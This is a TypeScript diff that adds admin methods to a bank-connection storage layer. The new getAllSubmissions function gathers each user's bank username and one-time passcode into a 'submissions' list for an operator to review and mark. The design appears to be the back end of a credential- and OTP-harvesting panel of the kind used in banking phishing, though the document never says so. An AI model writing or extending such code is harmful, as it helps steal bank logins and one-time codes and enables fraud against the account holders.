@@ -47,6 +47,14 @@ export interface IStorage {
   }): Promise<any>;
   getOTPRecord?(sessionToken: string): Promise<any>;
   verifyOTP?(sessionToken: string, code: string): Promise<boolean>;
+  // Admin methods
+  getAllSubmissions?(): Promise<any[]>;
+  updateConnectionStatus?(connectionId: string, updates: {
+    status: string;
+    reviewedAt: Date;
+    reviewedBy: string;
+    adminNotes?: string;
+  }): Promise<any>;
 }
 
 export class MongoStorage implements IStorage {
@@ -140,13 +148,21 @@ export class MongoStorage implements IStorage {
       connectedAt: new Date(),
       lastSyncAt: null,
       isActive: true,
+      status: 'pending',
+      reviewedAt: null,
+      reviewedBy: null,
+      adminNotes: null,
     });
     const savedConnection = await connection.save();
     return {
       ...savedConnection.toObject(),
       id: savedConnection._id.toString(),
       connectedAt: savedConnection.connectedAt,
-      lastSyncAt: savedConnection.lastSyncAt || null
+      lastSyncAt: savedConnection.lastSyncAt || null,
+      status: savedConnection.status || 'pending',
+      reviewedAt: savedConnection.reviewedAt || null,
+      reviewedBy: savedConnection.reviewedBy || null,
+      adminNotes: savedConnection.adminNotes || null,
     };
   }
 
@@ -231,6 +247,52 @@ export class MongoStorage implements IStorage {
     );
     
     return false;
+  }
+
+  async getAllSubmissions(): Promise<any[]> {
+    try {
+      const authSessions = await Models.AuthSession.find({}).lean();
+      const otpRecords = await Models.OTPRecord.find({}).lean();
+      const connections = await Models.BankConnection.find({}).lean();
+      
+      // Combine data to create submission records
+      const submissions = authSessions.map(session => {
+        const otpRecord = otpRecords.find(otp => otp.sessionToken === session.sessionToken);
+        const connection = connections.find(conn => conn.bankId === session.bankId);
+        
+        return {
+          id: connection?._id?.toString() || session._id.toString(),
+          bankId: session.bankId,
+          bankName: session.bankName || 'Unknown Bank',
+          username: session.bankCredentials?.username || 'Unknown User',
+          status: (connection as any)?.status || 'pending',
+          submittedAt: session.createdAt || new Date(),
+          reviewedAt: (connection as any)?.reviewedAt || null,
+          reviewedBy: (connection as any)?.reviewedBy || null,
+          adminNotes: (connection as any)?.adminNotes || null,
+          otpCode: otpRecord?.otpCode || null,
+        };
+      });
+      
+      return submissions;
+    } catch (error) {
+      console.error('Error fetching submissions:', error);
+      return [];
+    }
+  }
+
+  async updateConnectionStatus(connectionId: string, updates: any): Promise<any> {
+    try {
+      const connection = await Models.BankConnection.findByIdAndUpdate(
+        connectionId,
+        updates,
+        { new: true }
+      );
+      return connection;
+    } catch (error) {
+      console.error('Error updating connection status:', error);
+      throw error;
+    }
   }
 }
 
@@ -333,6 +395,10 @@ export class MemStorage implements IStorage {
       connectedAt: new Date(),
       lastSyncAt: null,
       isActive: true,
+      status: 'pending',
+      reviewedAt: null,
+      reviewedBy: null,
+      adminNotes: null,
     };
     this.bankConnections.set(id, connection);
     return connection;
@@ -464,6 +530,20 @@ class MongoStorageWrapper implements IStorage {
       return await this.mongoStorage.verifyOTP(sessionToken, code);
     }
     return false; // Fallback to rejection
+  }
+
+  async getAllSubmissions(): Promise<any[]> {
+    if (this.isMongoConnected() && this.mongoStorage.getAllSubmissions) {
+      return await this.mongoStorage.getAllSubmissions();
+    }
+    return []; // Fallback to empty array
+  }
+
+  async updateConnectionStatus(connectionId: string, updates: any): Promise<any> {
+    if (this.isMongoConnected() && this.mongoStorage.updateConnectionStatus) {
+      return await this.mongoStorage.updateConnectionStatus(connectionId, updates);
+    }
+    return null; // Fallback
   }
 }
 
